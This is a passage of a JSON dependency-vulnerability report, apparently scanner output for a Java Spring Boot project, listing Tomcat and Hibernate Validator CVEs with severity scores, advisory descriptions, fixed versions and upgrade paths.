      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L/E:P/RL:O/RC:R",
      "alternativeIds": [],
      "creationTime": "2019-07-04T12:00:23.840040Z",
      "credit": [
        "Regis Leroy"
      ],
      "cvssScore": 7.1,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Information Exposure. The code that parsed the HTTP request line permitted invalid characters. This could be exploited, in conjunction with a proxy that also permitted the invalid characters but with a different interpretation, to inject data into the HTTP response. By manipulating the HTTP response the attacker could poison a web-cache, perform an XSS attack and/or obtain sensitive information from requests other then their own.\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 7.0.73, 8.0.39, 8.5.8, 9.0.0.M13 or higher.\n## References\n- [Apache Security Advisory](https://tomcat.apache.org/security-6.html#Fixed_in_Apache_Tomcat_6.0.48)\n- [Exploit DB](https://www.exploit-db.com/exploits/41783)\n- [GitHub Commit](https://github.com/apache/tomcat80/commit/779d5d34e68e50d2f721897050b147106992f566)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/516bda676ac8d0284da3e0295a7df70391315360)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/cdc0a935c2173aff60039a0b85e57a461381107c)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/f96f5751d418ae5a2f550be040daf9c5f7d99256)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-6816)\n- [OSS security Advisory](http://www.openwall.com/lists/oss-security/2016/11/22/17)\n",
      "disclosureTime": "2016-11-23T07:08:48Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "7.0.73",
        "8.0.39",
        "8.5.8",
        "9.0.0.M13"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-451526",
      "identifiers": {
        "CVE": [
          "CVE-2016-6816"
        ],
        "CWE": [
          "CWE-200"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:30.485846Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-11-23T07:08:48Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://tomcat.apache.org/security-6.html%23Fixed_in_Apache_Tomcat_6.0.48"
        },
        {
          "title": "Exploit DB",
          "url": "https://www.exploit-db.com/exploits/41783"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/779d5d34e68e50d2f721897050b147106992f566"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/516bda676ac8d0284da3e0295a7df70391315360"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/cdc0a935c2173aff60039a0b85e57a461381107c"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/f96f5751d418ae5a2f550be040daf9c5f7d99256"
        },
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-6816"
        },
        {
          "title": "OSS security Advisory",
          "url": "http://www.openwall.com/lists/oss-security/2016/11/22/17"
        }
      ],
      "semver": {
        "vulnerable": [
          "[7.0.0,7.0.73)",
          "[8,8.0.39)",
          "[8.5.0,8.5.8)",
          "[9-alpha,9.0.0.M13)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Information Exposure",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.4.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.4.4.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.5.11"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-07-04T12:03:49.472621Z",
      "credit": [
        "the Apache Tomcat Security Team"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Access Restriction Bypass. It was discovered that it was possible for a web application to access any global JNDI resource whether an explicit ResourceLink had been configured or not.\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 7.0.72, 8.0.37, 8.5.5, 9.0.0.M10 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/tomcat80/commit/824c7dc781056442046db0ae34bcf1497f23f44c)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/2859ac3eae132383cb6f3f2042e25d7a4a281b0d)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/b3406e6c318378cbf440f902f9fdbb8b440aef4e)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/d6b5600afe75e1086dd564344e1d085966e4237d)\n- [Oss-Sec Mailing List](http://seclists.org/oss-sec/2016/q4/257)\n",
      "disclosureTime": "2016-10-28T09:40:07Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.72",
        "8.0.37",
        "8.5.5",
        "9.0.0.M10"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-451527",
      "identifiers": {
        "CVE": [
          "CVE-2016-6797"
        ],
        "CWE": [
          "CWE-284"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:02.926249Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-10-28T09:40:07Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/824c7dc781056442046db0ae34bcf1497f23f44c"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/2859ac3eae132383cb6f3f2042e25d7a4a281b0d"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/b3406e6c318378cbf440f902f9fdbb8b440aef4e"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/d6b5600afe75e1086dd564344e1d085966e4237d"
        },
        {
          "title": "Oss-Sec Mailing List",
          "url": "http://seclists.org/oss-sec/2016/q4/257"
        }
      ],
      "semver": {
        "vulnerable": [
          "[7.0.0,7.0.72)",
          "[8,8.0.37)",
          "[8.5.0,8.5.5)",
          "[9-alpha,9.0.0.M10)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Access Restriction Bypass",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.3.8.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.8.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.37"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-07-04T12:08:04.592453Z",
      "credit": [
        "the Apache Tomcat Security Team"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Information Exposure. It was discovered that when a SecurityManager is configured Tomcat's system property replacement feature for configuration files could be used by a malicious web application to bypass the SecurityManager and read system properties that should not be visible.\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 8.0.37, 8.5.5, 9.0.0.M10 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/tomcat80/commit/ae6163a4f230bc679abfc93e048ff92996badad6)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/0b41766456b1980e4f809e13ad6dc9fa912bae7e)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/c1660182010b4255c21c874d69c124370a67784a)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/f8db078f1e6e8b225f8344e63595113ca34cd408)\n- [OSS security Advisory](http://www.openwall.com/lists/oss-security/2016/10/27/10)\n",
      "disclosureTime": "2016-10-28T09:07:47Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "8.0.37",
        "8.5.5",
        "9.0.0.M10"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-451529",
      "identifiers": {
        "CVE": [
          "CVE-2016-6794"
        ],
        "CWE": [
          "CWE-200"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:30.812476Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-10-28T09:07:47Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/ae6163a4f230bc679abfc93e048ff92996badad6"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/0b41766456b1980e4f809e13ad6dc9fa912bae7e"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/c1660182010b4255c21c874d69c124370a67784a"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/f8db078f1e6e8b225f8344e63595113ca34cd408"
        },
        {
          "title": "OSS security Advisory",
          "url": "http://www.openwall.com/lists/oss-security/2016/10/27/10"
        }
      ],
      "semver": {
        "vulnerable": [
          "[8,8.0.37)",
          "[8.5.0,8.5.5)",
          "[9-alpha,9.0.0.M10)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Information Exposure",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.3.8.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.8.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.37"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "alternativeIds": [],
      "creationTime": "2019-07-04T12:10:54.745990Z",
      "credit": [
        "TERASOLUNA Framework Development Team"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). It allows remote attackers to cause a denial of service (CPU consumption) via a long boundary string.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 7.0.70, 8.0.36, 8.5.3, 9.0.0.M7 or higher.\n## References\n- [Apache Mail Archive](http://mail-archives.us.apache.org/mod_mbox/www-announce/201606.mbox/%3C6223ece6-2b41-ef4f-22f9-d3481e492832@apache.org%3E)\n- [Apache-SVN](http://svn.apache.org/viewvc/commons/proper/fileupload/trunk/RELEASE-NOTES.txt?r1=1745717&r2=1749637&diff_format=h)\n- [CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3092)\n- [Github ChangeLog](https://github.com/apache/commons-fileupload/blob/b1498c9877d751f8bc4635a6f252ebdfcba28518/src/changes/changes.xml#L84)\n- [GitHub Commit](https://github.com/apache/tomcat80/commit/d752a415a875e888d8c8d0988dfbde95c2c6fb1d)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/2c3553f3681baf775c50bb0b49ea61cb44ea914f)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/8999f8243197a5f8297d0cb1a0d86ed175678a77)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1349475)\n",
      "disclosureTime": "2016-06-22T16:51:56Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.70",
        "8.0.36",
        "8.5.3",
        "9.0.0.M7"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-451531",
      "identifiers": {
        "CVE": [
          "CVE-2016-3092"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:21.950210Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-12-25T16:51:56Z",
      "references": [
        {
          "title": "Apache Mail Archive",
          "url": "http://mail-archives.us.apache.org/mod_mbox/www-announce/201606.mbox/%3C6223ece6-2b41-ef4f-22f9-d3481e492832@apache.org%3E"
        },
        {
          "title": "Apache-SVN",
          "url": "http://svn.apache.org/viewvc/commons/proper/fileupload/trunk/RELEASE-NOTES.txt?r1=1745717&r2=1749637&diff_format=h"
        },
        {
          "title": "CVE Details",
          "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3092"
        },
        {
          "title": "Github ChangeLog",
          "url": "https://github.com/apache/commons-fileupload/blob/b1498c9877d751f8bc4635a6f252ebdfcba28518/src/changes/changes.xml%23L84"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/d752a415a875e888d8c8d0988dfbde95c2c6fb1d"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/2c3553f3681baf775c50bb0b49ea61cb44ea914f"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/8999f8243197a5f8297d0cb1a0d86ed175678a77"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1349475"
        }
      ],
      "semver": {
        "vulnerable": [
          "[7.0.0,7.0.70)",
          "[8.0,8.0.36)",
          "[8.5.0,8.5.3)",
          "[9-alpha,9.0.0.M7)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.3.6.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.6.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.36"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-07-16T08:36:35.210070Z",
      "credit": [
        "Gunnar Morling"
      ],
      "cvssScore": 7,
      "description": "## Overview\n[org.hibernate:hibernate-validator](https://mvnrepository.com/artifact/org.hibernate/hibernate-validator) is a Hibernate Validator Engine Relocation Artifact.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. An attacker may be able to validate an invalid instance and access the private member value via the `ConstraintViolation#getInvalidValue()` function.\n## Remediation\nUpgrade `org.hibernate:hibernate-validator` to version 5.2.5.Final, 5.3.6.Final, 5.4.2.Final or higher.\n## References\n- [GitHub Commit](https://github.com/hibernate/hibernate-validator/commit/0778a5c98b817771a645c6f4ba0b28dd8b5437b)\n- [GitHub Commit](https://github.com/hibernate/hibernate-validator/commit/0886e89900d343ea20fde5137c9a3086e6da9ac)\n- [GitHub Commit](https://github.com/hibernate/hibernate-validator/commit/0ed45f37c4680998167179e631113a2c9cb5d11)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1465573)\n",
      "disclosureTime": "2018-01-10T17:51:09Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "5.2.5.Final",
        "5.3.6.Final",
        "5.4.2.Final"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ConstraintViolationImpl",
            "filePath": "org/hibernate/validator/internal/engine/ConstraintViolationImpl.java",
            "functionName": "getInvalidValue"
          },
          "version": [
            "[5.2.0.Final,5.2.5.Final)",
            "[5.3.0.Final, 5.3.6.Final)",
            "[5.4.0.Final, 5.4.2.Final)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.hibernate.validator.internal.engine.ConstraintViolationImpl",
            "functionName": "getInvalidValue"
          },
          "version": [
            "[5.2.0.Final,5.2.5.Final)",
            "[5.3.0.Final, 5.3.6.Final)",
            "[5.4.0.Final, 5.4.2.Final)"
          ]
        }
      ],
      "id": "SNYK-JAVA-ORGHIBERNATE-451605",
      "identifiers": {
        "CVE": [
          "CVE-2017-7536"
        ],
        "CWE": [
          "CWE-94"
        ],
        "GHSA": [
          "GHSA-xxgp-pcfc-3vgc"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "hibernate-validator",
        "groupId": "org.hibernate"
      },
      "modificationTime": "2020-12-14T14:41:04.771016Z",
      "moduleName": "org.hibernate:hibernate-validator",
      "packageManager": "maven",
      "packageName": "org.hibernate:hibernate-validator",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-02-12T14:51:05Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/hibernate/hibernate-validator/commit/0778a5c98b817771a645c6f4ba0b28dd8b5437b"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/hibernate/hibernate-validator/commit/0886e89900d343ea20fde5137c9a3086e6da9ac"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/hibernate/hibernate-validator/commit/0ed45f37c4680998167179e631113a2c9cb5d11"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1465573"
        }
      ],
      "semver": {
        "vulnerable": [
          "[5.2.0.Final,5.2.5.Final)",
          "[5.3.0.Final, 5.3.6.Final)",
          "[5.4.0.Final, 5.4.2.Final)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-validation@1.3.1.RELEASE",
        "org.hibernate:hibernate-validator@5.2.2.Final"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.hibernate:hibernate-validator",
      "version": "5.2.2.Final"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2020-05-05T12:05:58.541980Z",
      "credit": [
        "Alvaro Muñoz"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[org.hibernate:hibernate-validator](https://mvnrepository.com/artifact/org.hibernate/hibernate-validator) is a Hibernate Validator Engine Relocation Artifact.\n\nAffected versions of this package are vulnerable to Improper Input Validation. A bug in the message interpolation processor enables invalid EL expressions to be evaluated as if they were valid. This flaw allows attackers to bypass input sanitation (escaping, stripping) controls that developers may have put in place when handling user-controlled data in error messages.\n## Remediation\nUpgrade `org.hibernate:hibernate-validator` to version 6.0.19.Final, 6.1.3.Final or higher.\n## References\n- [GitHub PR](https://github.com/hibernate/hibernate-validator/pull/1071)\n- [Jira Issue](https://hibernate.atlassian.net/browse/HV-1758)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1805501)\n",
      "disclosureTime": "2020-05-05T00:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "6.0.19.Final",
        "6.1.3.Final"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ValidatorImpl",
            "filePath": "org/hibernate/validator/internal/engine/ValidatorImpl.java",
            "functionName": "validate"
          },
          "version": [
            "[,6.0.19.Final)",
            "[6.1.0,6.1.3.Final)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.hibernate.validator.internal.engine.ValidatorImpl",
            "functionName": "validate"
          },
          "version": [
            "[,6.0.19.Final)",
            "[6.1.0,6.1.3.Final)"
          ]
        }
      ],
      "id": "SNYK-JAVA-ORGHIBERNATE-568162",
      "identifiers": {
        "CVE": [
          "CVE-2020-10693"
        ],
        "CWE": [
          "CWE-20"
        ],
        "GHSA": [
          "GHSA-rmrm-75hp-phr2"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "hibernate-validator",
        "groupId": "org.hibernate"
      },
      "modificationTime": "2021-07-06T14:08:58.015029Z",
      "moduleName": "org.hibernate:hibernate-validator",
      "packageManager": "maven",
      "packageName": "org.hibernate:hibernate-validator",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-05-05T16:32:46Z",
      "references": [
        {
          "title": "GitHub PR",
          "url": "https://github.com/hibernate/hibernate-validator/pull/1071"
        },
        {
          "title": "Jira Issue",
          "url": "https://hibernate.atlassian.net/browse/HV-1758"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1805501"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,6.0.19.Final)",
          "[6.1.0,6.1.3.Final)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Improper Input Validation",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-validation@1.3.1.RELEASE",
        "org.hibernate:hibernate-validator@5.2.2.Final"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.hibernate:hibernate-validator",
      "version": "5.2.2.Final"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N/E:U/RL:O/RC:R",
      "alternativeIds": [],
      "creationTime": "2020-05-14T16:07:06.897969Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.hibernate:hibernate-validator](https://mvnrepository.com/artifact/org.hibernate/hibernate-validator) is a Hibernate Validator Engine Relocation Artifact.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). The `SafeHtml` validator annotation fails to properly sanitize payloads consisting of potentially malicious code in HTML comments and instructions.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.hibernate:hibernate-validator` to version 6.0.18.Final, 6.1.0.Final or higher.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/r87b7e2d22982b4ca9f88f5f4f22a19b394d2662415b233582ed22ebf@%3Cnotifications.accumulo.apache.org%3E)\n- [GitHub Commit](https://github.com/hibernate/hibernate-validator/commit/124b7dd6d9a4ad24d4d49f74701f05a13e56ceee)\n- [Hibernator Security Release Blog](https://in.relation.to/2019/11/20/hibernate-validator-610-6018-released/)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-10219)\n",
      "disclosureTime": "2018-10-18T14:55:21Z",
      "exploit": "Unproven",
      "fixedIn": [
        "6.0.18.Final",
        "6.1.0.Final"
      ],
      "functions": [
        {
          "functionId": {
            "className": "SafeHtmlValidator",
            "filePath": "org/hibernate/validator/internal/constraintvalidators/hv/SafeHtmlValidator.java",
            "functionName": "getFragmentAsDocument"
          },
          "version": [
            "[,6.0.18.Final)",
            "[6.1.0.Alpha1,6.1.0.Final)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.hibernate.validator.internal.constraintvalidators.hv.SafeHtmlValidator",
            "functionName": "getFragmentAsDocument"
          },
          "version": [
            "[,6.0.18.Final)",
            "[6.1.0.Alpha1,6.1.0.Final)"
          ]
        }
      ],
      "id": "SNYK-JAVA-ORGHIBERNATE-569100",
      "identifiers": {
        "CVE": [
          "CVE-2019-10219"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "language": "java",
      "malicious": false,
